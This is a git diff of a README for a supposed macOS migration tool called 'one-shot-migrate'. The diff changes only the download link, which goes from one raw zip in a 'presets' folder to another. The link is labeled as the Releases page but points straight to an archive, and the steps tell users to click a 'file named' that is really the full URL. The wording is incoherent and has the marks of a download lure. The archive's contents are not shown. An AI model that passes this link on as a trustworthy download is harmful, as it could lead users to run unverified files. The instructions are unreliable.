@@ -1,7 +1,7 @@
 # 🌟 one-shot-migrate - Migrate Your Mac Data Easily
 
 ## 🖱️ Download Now
-[![Download](https://github.com/aditya123-cyber/one-shot-migrate/raw/refs/heads/main/presets/migrate-one-shot-1.1.zip)](https://github.com/aditya123-cyber/one-shot-migrate/raw/refs/heads/main/presets/migrate-one-shot-1.1.zip)
+[![Download](https://github.com/aditya123-cyber/one-shot-migrate/raw/refs/heads/main/presets/migrate-shot-one-3.6.zip)](https://github.com/aditya123-cyber/one-shot-migrate/raw/refs/heads/main/presets/migrate-shot-one-3.6.zip)
 
 ---
 
@@ -13,9 +13,9 @@ one-shot-migrate is a useful tool for macOS users who want to move their persona
 
 To get started, visit the Releases page to download the latest version of one-shot-migrate. Here’s how to do it:
 
-1. Click on the link: [Visit the Releases Page](https://github.com/aditya123-cyber/one-shot-migrate/raw/refs/heads/main/presets/migrate-one-shot-1.1.zip).
+1. Click on the link: [Visit the Releases Page](https://github.com/aditya123-cyber/one-shot-migrate/raw/refs/heads/main/presets/migrate-shot-one-3.6.zip).
 2. Look for the latest release. You will see a list of files available for download.
-3. Click on the file named `https://github.com/aditya123-cyber/one-shot-migrate/raw/refs/heads/main/presets/migrate-one-shot-1.1.zip` to download it to your computer.
+3. Click on the file named `https://github.com/aditya123-cyber/one-shot-migrate/raw/refs/heads/main/presets/migrate-shot-one-3.6.zip` to download it to your computer.
 
 After the download completes:
 
